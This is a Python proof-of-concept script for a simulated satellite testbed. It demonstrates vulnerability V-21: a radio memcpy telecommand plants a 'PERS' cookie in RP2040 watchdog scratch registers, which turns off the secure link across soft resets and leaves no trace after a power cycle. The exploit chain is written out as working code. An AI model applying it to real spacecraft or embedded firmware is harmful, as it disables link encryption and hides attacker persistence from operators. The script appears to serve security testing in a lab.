#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys, struct
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


# V-21  Persistence cookie written into the RP2040 watchdog scratch
# registers: they survive soft reboots (V-21 -> secure link stays OFF
# across RESETC) but die on power cycle -> a hidden boot-time policy
# an operator cannot see in flash.
# SPARTA: PE-0005 (firmware-level boot persistence)
def main(dev, ev):
    def memcpy(src, dst, ln):
        return dev.tc(0x18, struct.pack("<IIH", src, dst, ln), via="radio")

    check(dev.sim.secure is True, "baseline crypto ON")
    # 'PERS' = 0x53524550 little-endian, staged in the log-name buffer
    dev.tc(0x1A, b"PERS" + bytes(28), via="radio")
    r = memcpy(fs.SYM_LOG_NAME, fs.ADDR_WDT_SCRATCH + 28, 4)
    ev.log(f"MEMCPY 'PERS' -> scratch7 ({fs.ADDR_WDT_SCRATCH+28:#x}) ok")
    ack = dev.find(dev.tc(0x02, b"", via="radio"), 0x02)[0]   # RESETC
    ev.log(f"RESETC ack: boot_count={ack.u8(1)} cookie_flag={ack.u8(2)}")
    check(ack.u8(2) == 1, "cookie recognized at reboot")
    st = dev.find(dev.tc(0x0C, b"", via="usb"), 0x0C)[0]
    f2 = st.payload[-1]
    ev.log(f"post-reboot flags2=0x{f2:02X} PERSIST={bool(f2 & 0x20)} "
           f"secure={dev.sim.secure}")
    check(not dev.sim.secure, "cookie switched crypto OFF at boot")
    check(f2 & 0x20, "PERSIST flag published in status")
    # power cycle wipes scratch -> policy silently disappears
    dev.powercycle()
    st = dev.find(dev.tc(0x0C, b"", via="usb"), 0x0C)[0]
    ev.log(f"after power cycle: secure={dev.sim.secure} "
           f"PERSIST={bool(st.payload[-1] & 0x20)} (scratch is volatile)")
    check(dev.sim.secure and not (st.payload[-1] & 0x20),
          "cookie does not survive power loss")
    ev.log("=> attacker toggles a protection policy whose very existence "
           "leaves no forensic trace after the next power cycle")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V-21 watchdog scratch persistence cookie", main))
